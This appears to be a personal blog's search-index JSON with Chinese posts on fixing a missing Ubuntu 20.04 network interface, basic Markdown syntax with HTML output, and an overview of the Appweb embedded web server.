[{"categories":["Tech"],"content":"解决Ubuntu 20.04中eth0或ens33网卡突然消失的情况。","date":"2021-06-18","objectID":"/2021/06/Ubuntu/","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"Ubuntu 20.04 网络ens33消失问题解决 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:0:0","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"Ubuntu 20.04 突然丢失网卡驱动 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:0","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"1. 问题描述 Ubuntu 20.04 LTS版本，在进行一次suspend操作后，发现网卡驱动丢失。执行ifconfig命令未发现正常的eth0或ens33网卡，但是执行ifconfig -a可以发现ens33网卡存在，但是没有正常IP。 桌面右上角没有网络连接的图标，在设置中也没有网络设置相关内容。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:1","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"2. 解决 1. 临时解决办法 执行如下命令： sudo dhclient ens33 sudo ifconfig ens33 2. 稳定解决办法 清理原有的网络配置相关选项，重启网络。Ubuntu 20.04使用了NetworkManager`的网络服务管理程序。执行如下命令： service NetworkManager stop # 停止当前网络服务 sudo rm /var/lib/NetworkManager/NetworkManager.state # 建议在删除该状态文件前先进行备份 service NetworkManager start # 启动网络服务 经过以上步骤后，网络可恢复正常。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:2","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"3. 最后的最后 重置虚拟网络配置器。这是最后的办法，实在无法确定网络问题原因时再使用。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:3","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Markdown"],"content":"这篇文章展示了基本的 Markdown 语法和格式.","date":"2019-12-01","objectID":"/basic-markdown-syntax/","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"这篇文章提供了可以在 Hugo 的文章中使用的基本 Markdown 语法示例. 注意 这篇文章借鉴了一篇很棒的来自 Grav 的文章. 如果你想了解 Loveit 主题的扩展 Markdown 语法, 请阅读扩展 Markdown 语法页面. 事实上, 编写 Web 内容很麻烦. WYSIWYG所见即所得 编辑器帮助减轻了这一任务. 但通常会导致代码太糟, 或更糟糕的是, 网页也会很丑. 没有通常伴随的所有复杂和丑陋的问题, Markdown 是一种更好的生成 HTML 内容的方式. 一些主要好处是: Markdown 简单易学, 几乎没有多余的字符, 因此编写内容也更快. 用 Markdown 书写时出错的机会更少. 可以产生有效的 XHTML 输出. 将内容和视觉显示保持分开, 这样就不会打乱网站的外观. 可以在你喜欢的任何文本编辑器或 Markdown 应用程序中编写内容. Markdown 使用起来很有趣! John Gruber, Markdown 的作者如是说: Markdown 格式的首要设计目标是更具可读性. 最初的想法是 Markdown 格式的文档应当以纯文本形式发布, 而不会看起来像被标签或格式说明所标记. 虽然 Markdown 的语法受到几种现有的文本到 HTML 转换工具的影响, 但 Markdown 语法的最大灵感来源是纯文本电子邮件的格式. – John Gruber 话不多说, 我们来回顾一下 Markdown 的主要语法以及生成的 HTML 样式! 技巧  将此页保存为书签，以备将来参考! ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:0:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"1 标题 从 h2 到 h6 的标题在每个级别上都加上一个 ＃: ## h2 标题 ### h3 标题 #### h4 标题 ##### h5 标题 ###### h6 标题 输出的 HTML 看起来像这样: \u003ch2\u003eh2 标题\u003c/h2\u003e \u003ch3\u003eh3 标题\u003c/h3\u003e \u003ch4\u003eh4 标题\u003c/h4\u003e \u003ch5\u003eh5 标题\u003c/h5\u003e \u003ch6\u003eh6 标题\u003c/h6\u003e 标题 ID 要添加自定义标题 ID, 请在与标题相同的行中将自定义 ID 放在花括号中: ### 一个很棒的标题 {#custom-id} 输出的 HTML 看起来像这样: \u003ch3 id=\"custom-id\"\u003e一个很棒的标题\u003c/h3\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:1:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"2 注释 注释是和 HTML 兼容的： \u003c!-- 这是一段注释 --\u003e 不能看到以下的注释: ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:2:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"3 水平线 HTML 中的 \u003chr\u003e 标签是用来在段落元素之间创建一个 “专题间隔” 的. 使用 Markdown, 你可以用以下方式创建一个 \u003chr\u003e 标签: ___: 三个连续的下划线 ---: 三个连续的破折号 ***: 三个连续的星号 呈现的输出效果如下: ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:3:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"4 段落 按照纯文本的方式书写段落, 纯文本在呈现的 HTML 中将用 \u003cp\u003e/\u003c/p\u003e 标签包裹. 如下段落: Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad. 输出的 HTML 看起来像这样: \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e 可以使用一个空白行进行换行. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:4:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"5 内联 HTML 元素 如果你需要某个 HTML 标签 (带有一个类), 则可以简单地像这样使用: Markdown 格式的段落. \u003cdiv class=\"class\"\u003e 这是 \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown 格式的段落. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:5:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"6 强调 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"加粗 用于强调带有较粗字体的文本片段. 以下文本片段会被 渲染为粗体. **渲染为粗体** __渲染为粗体__ 输出的 HTML 看起来像这样: \u003cstrong\u003e渲染为粗体\u003c/strong\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"斜体 用于强调带有斜体的文本片段. 以下文本片段被 渲染为斜体. *渲染为斜体* _渲染为斜体_ 输出的 HTML 看起来像这样: \u003cem\u003e渲染为斜体\u003c/em\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"删除线 按照 GFMGitHub flavored Markdown 你可以使用删除线. ~~这段文本带有删除线.~~ 呈现的输出效果如下: 这段文本带有删除线. 输出的 HTML 看起来像这样: \u003cdel\u003e这段文本带有删除线.\u003c/del\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"组合 加粗, 斜体, 和删除线可以 组合使用. ***加粗和斜体*** ~~**删除线和加粗**~~ ~~*删除线和斜体*~~ ~~***加粗, 斜体和删除线***~~ 呈现的输出效果如下: 加粗和斜体 删除线和加粗 删除线和斜体 加粗, 斜体和删除线 输出的 HTML 看起来像这样: \u003cem\u003e\u003cstrong\u003e加粗和斜体\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003e删除线和加粗\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e删除线和斜体\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003e加粗, 斜体和删除线\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:4","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"7 引用 用于在文档中引用其他来源的内容块. 在要引用的任何文本之前添加 \u003e: \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 呈现的输出效果如下: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 输出的 HTML 看起来像这样: \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e 引用也可以嵌套: \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. 呈现的输出效果如下: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:7:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"8 列表 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"无序列表 一系列项的列表, 其中项的顺序没有明显关系. 你可以使用以下任何符号来表示无序列表中的项: * 一项内容 - 一项内容 + 一项内容 例如: * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e \u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"有序列表 一系列项的列表, 其中项的顺序确实很重要. 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e 技巧 如果你对每一项使用 1., Markdown 将自动为每一项编号. 例如: 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"任务列表 任务列表使你可以创建带有复选框的列表. 要创建任务列表, 请在任务列表项之前添加破折号 (-) 和带有空格的方括号 ([ ]). 要选择一个复选框，请在方括号之间添加 x ([x]). - [x] Write the press release - [ ] Update the website - [ ] Contact the media 呈现的输出效果如下: Write the press release Update the website Contact the media ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"9 代码 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"行内代码 用 ` 包装行内代码段. 在这个例子中, `\u003csection\u003e\u003c/section\u003e` 会被包裹成 **代码**. 呈现的输出效果如下: 在这个例子中, \u003csection\u003e\u003c/section\u003e 会被包裹成 代码. 输出的 HTML 看起来像这样: \u003cp\u003e 在这个例子中, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e 会被包裹成 \u003cstrong\u003e代码\u003c/strong\u003e. \u003c/p\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"缩进代码 将几行代码缩进至少四个空格，例如: // Some comments line 1 of code line 2 of code line 3 of code 呈现的输出效果如下: // Some comments line 1 of code line 2 of code line 3 of code 输出的 HTML 看起来像这样: \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"围栏代码块 使用 “围栏” ``` 来生成一段带有语言属性的代码块. ```markdown Sample text here... ``` 输出的 HTML 看起来像这样: \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"语法高亮 GFMGitHub Flavored Markdown 也支持语法高亮. 要激活它，只需在第一个代码 “围栏” 之后直接添加你要使用的语言的文件扩展名, ```js, 语法高亮显示将自动应用于渲染的 HTML 中. 例如, 在以下 JavaScript 代码中应用语法高亮: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` 呈现的输出效果如下: grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; 注意 Hugo 文档中的 语法高亮页面 介绍了有关语法高亮的更多信息, 包括语法高亮的 shortcode. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:4","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"10 表格 通过在每个单元格之间添加竖线作为分隔线, 并在标题下添加一行破折号 (也由竖线分隔) 来创建表格. 注意, 竖线不需要垂直对齐. | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. 输出的 HTML 看起来像这样: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e 文本右对齐或居中对齐 在任何标题下方的破折号右侧添加冒号将使该列的文本右对齐. 在任何标题下方的破折号两边添加冒号将使该列的对齐文本居中. | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:10:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"11 链接 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"基本链接 \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io) 呈现的输出效果如下 (将鼠标悬停在链接上，没有提示): https://assemble.io contact@revolunet.com Assemble 输出的 HTML 看起来像这样: \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"添加一个标题 [Upstage](https://github.com/upstage/ \"Visit Upstage!\") 呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): Upstage 输出的 HTML 看起来像这样: \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"定位标记 定位标记使你可以跳至同一页面上的指定锚点. 例如, 每个章节: ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3) 将跳转到这些部分: ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one. 注意 定位标记的位置几乎是任意的. 因为它们并不引人注目, 所以它们通常被放在同一行了. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"12 脚注 脚注使你可以添加注释和参考, 而不会使文档正文混乱. 当你创建脚注时, 会在添加脚注引用的位置出现带有链接的上标编号. 读者可以单击链接以跳至页面底部的脚注内容. 要创建脚注引用, 请在方括号中添加插入符号和标识符 ([^1]). 标识符可以是数字或单词, 但不能包含空格或制表符. 标识符仅将脚注引用与脚注本身相关联 - 在脚注输出中, 脚注按顺序编号. 在中括号内使用插入符号和数字以及用冒号和文本来添加脚注内容 ([^1]：这是一段脚注). 你不一定要在文档末尾添加脚注. 可以将它们放在除列表, 引用和表格等元素之外的任何位置. 这是一个数字脚注[^1]. 这是一个带标签的脚注[^label] [^1]: 这是一个数字脚注 [^label]: 这是一个带标签的脚注 这是一个数字脚注1. 这是一个带标签的脚注2 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:12:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"13 图片 图片的语法与链接相似, 但包含一个在前面的感叹号. ![Minion](https://octodex.github.com/images/minion.png) 或者: ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\") The StormtroopocatAlt text \" The Stormtroopocat 像链接一样, 图片也具有脚注样式的语法: ![Alt text][id] The DojocatAlt text \" The Dojocat 稍后在文档中提供参考内容, 用来定义 URL 的位置: [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\" 技巧 LoveIt 主题提供了一个包含更多功能的 图片的 shortcode. 这是一个数字脚注 ↩︎ 这是一个带标签的脚注 ↩︎ ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:13:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Tech"],"content":"总结整理一下Appweb重要的知识点。","date":"2021-05-31","objectID":"/2021/05/Appweb-1/","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"一、Appweb概述 Appweb是用于 Web 应用程序的嵌入式 Web 服务器。 它速度快，具备丰富的安全功能套件。 Appweb通过事件驱动的多线程内核托管对动态嵌入式 Web 应用程序进行了优化，可以提供快速响应、快速吞吐量和有效内存利用率。 它结构紧凑，只需使用 2MB 的内存（通常为 2-4MB）即可嵌入。 Appweb具有一组强大的功能，包括HTTP/1、HTTP/2、SSL/TLS、基本和摘要身份验证、虚拟主机、可加载模块、沙盒资源限制、日志记录、服务监控过程以及广泛的配置和编译控制。Appweb支持多种网络框架，包括ESP、PHP、Python、Perl 和 CGI。 作为部署最广泛的嵌入式 Web 服务器之一，Appweb被用于网络设备、电话、移动设备、消费和办公设备以及高速 Web 服务。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:1:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"二、Appweb的优势和特点 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"1. 快速开发 创建动态设备管理应用程序的最简单且最具成本效益的方式。它具有嵌入式 Web 应用程序所需的所有功能，因此开发和发布后维护成本将显着降低。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:1","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"2. 最小资源需求 快速和紧凑（最小需求仅2MB）。它只占用很少的系统资源，因此可以将重要的系统资源用于运行应用程序。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:2","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"3. 灵活的开发环境 高度模块化，因此按照不同需求选择不同的功能。它支持运行时模块加载和广泛的编译时控制，这对于希望重新编译源码的开发者来说十分有用。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:3","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"4. 安全性和可靠性 部署最广泛的嵌入式 Web 服务器之一，拥有大量用户对代码进行测试和优化。它有一个广泛的回归测试套件，对产品的压力测试远远超过正常环境中可能遇到的限制。完善的SSL/TLS、身份验证、沙盒指令和防御性策略等功能可最大程度保护用户免受攻击。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:4","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"5. 性能 具有事件驱动、多线程内核的同类产品中最快的性能。Appweb使用基于 arena 的内存分配器来防止内存泄漏并提供最高性能，在 PC 类设备上每秒可以处理超过 40,000 个请求。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:5","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"6. 规范性 支持 HTTP/1.0、HTTP/1.1、HTTP/2（仅限企业版）、CGI/1.1、SSL RFC 2246、HTTP RFC 2617等协议标准。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:6","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"7. 可移植性 Appweb 已移植到 Linux、Windows、Mac OS 和 BSD，并支持以下 CPU 架构：ARM、MIPS、i386/X86/X86_64、PowerPC、SH 和 Sparc。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:7","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"三、嵌入式设备应用 在嵌入式设备或应用中，web server功能的重要性次于设备必须运行的功能。因此，web server 必须最大限度地减少其资源需求，并且确定它放置在系统上的负载。 Appweb 根据这种特性进行深度优化： 快速并且只占用很小的内存资源（通常为2-4MB） 对系统资源的需求最小——通过可配置的资源限制 ESP C Web 框架在不影响开发人员功能的情况下，运行时效率最高 默认安全，开发安全 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:3:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"四、Appweb 内部组件 Appweb 的核心是一个事件驱动的、多线程的 HTTP pipe，在它上面加载模块以提供特定于内容的处理并扩展其功能。 Appweb 具有如下特点： 高性能多线程内核 动态模块加载的模块化结构 HTTP/1， HTTP/2 和WebSocket 支持 带有过滤器的灵活的请求pipeline 可以有效避免内存泄漏的快速的专用内存分配器和垃圾回收 可移植运行时 使用沙盒控制资源消耗 安全可靠的运行时可防止常见的安全漏洞，例如缓冲区溢出漏洞。 兼容Apache配置 全面的日志和调试跟踪 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"1. Routing Engine 在现代 Web 应用程序中，一般需要根据功能对应用程序的不同部分进行划分，并对各个部分进行不同的处理。 例如可能只想将访问权限限制为经过身份验证的用户，或者希望缓存一些缓慢变化但动态的数据的输出，或者可能想要使用 RESTful URI（其中 URI 的含义取决于 HTTP method）。 原因有很多，但 Web 服务器必须提供一种方法来以不同方式处理各种 URI 的处理， Appweb 同样提供了路由引擎来处理该问题。 Appweb 具有高效灵活的路由引擎，允许以不同方式处理（路由）URI group。 路由在 appweb.conf 配置文件中创建，使用 Route 定义一组适用于 URI 组的处理指令。 Route 指令指定符合条件的请求所必须匹配的 URI 前缀，匹配策略可以是一个简单的字符串或正则表达式。 可以创建任意数量的路由，并按照它们在 appweb.conf 文件中定义的顺序进行处理。 路由也可以嵌套，以便内部路由继承外部路由块的定义。 